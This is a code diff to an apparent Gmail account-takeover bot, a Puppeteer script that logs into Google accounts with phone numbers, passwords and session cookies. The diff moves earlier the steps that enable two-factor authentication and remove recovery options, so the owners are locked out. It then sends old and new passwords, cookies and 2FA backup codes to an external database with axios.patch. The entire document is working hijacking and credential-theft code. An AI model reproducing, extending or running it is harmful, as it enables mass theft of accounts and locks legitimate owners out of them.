@@ -21,7 +21,7 @@ let mCookie = [
       value: '',       
       domain: 'accounts.google.com',
       path: '/',
-      expires: 1768227818.828837,
+      expires: 1800212948.828837,
       size: 94,
       httpOnly: true,
       secure: true,
@@ -36,7 +36,7 @@ let mCookie = [
       value: '',
       domain: 'myaccount.google.com',
       path: '/',
-      expires: 1771251816.153073,
+      expires: 1800212948.153073,
       size: 157,
       httpOnly: true,
       secure: true,
@@ -50,7 +50,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957588,
+      expires: 1800212948.957588,
       size: 41,
       httpOnly: false,
       secure: true,
@@ -64,7 +64,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957573,
+      expires: 1800212948.957573,
       size: 40,
       httpOnly: false,
       secure: false,
@@ -78,7 +78,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957563,
+      expires: 1800212948.957563,
       size: 21,
       httpOnly: true,
       secure: true,
@@ -92,7 +92,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957496,
+      expires: 1800212948.957496,
       size: 167,
       httpOnly: true,
       secure: true,
@@ -106,7 +106,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957482,
+      expires: 1800212948.957482,
       size: 156,
       httpOnly: false,
       secure: false,
@@ -120,7 +120,7 @@ let mCookie = [
       value: '',
       domain: '.google.com',
       path: '/',
-      expires: 1771251815.957553,
+      expires: 1800212948.957553,
       size: 21,
       httpOnly: true,
       secure: false,
@@ -321,12 +321,20 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                     rapt = await getRapt(await page.url())
 
                     if (rapt) mRapt = rapt
-    
+
+                    let mTwoFa = await waitForTwoFaActive(page, mRapt)
+        
+                    console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
+
+                    await waitForRemoveRecovery(page, mRapt)
+
                     if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
 
                     if(mPassword) {
+                        let n_cookies = await getNewCookies(await page.cookies())
+                        
                         try {
-                            await axios.patch(DATABASE_URL+'gmail/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
+                            await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
                                 headers: {
                                     'Content-Type': 'application/x-www-form-urlencoded'
                                 }
@@ -334,8 +342,6 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                         } catch (error) {}
         
                         console.log('Process: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
-
-                        await waitForRemoveRecovery(page, mRapt)
                         
                         await waitForLanguageChange(page)
         
@@ -346,22 +352,6 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                         console.log('Process: [ Skip Password: Stop --- Time: '+getTime()+' ]')
         
                         await waitForNameChange(page, mRapt)
-        
-                        let mTwoFa = await waitForTwoFaActive(page, mRapt)
-        
-                        console.log('Process: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
-
-                        let n_cookies = await getNewCookies(await page.cookies())
-                        
-                        try {
-                            await axios.patch(DATABASE_URL+'gmail/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
-                                headers: {
-                                    'Content-Type': 'application/x-www-form-urlencoded'
-                                }
-                            })
-
-                            console.log('Process: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
-                        } catch (error) {}
                     } else {
                         try {
                             await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, create: time }), {
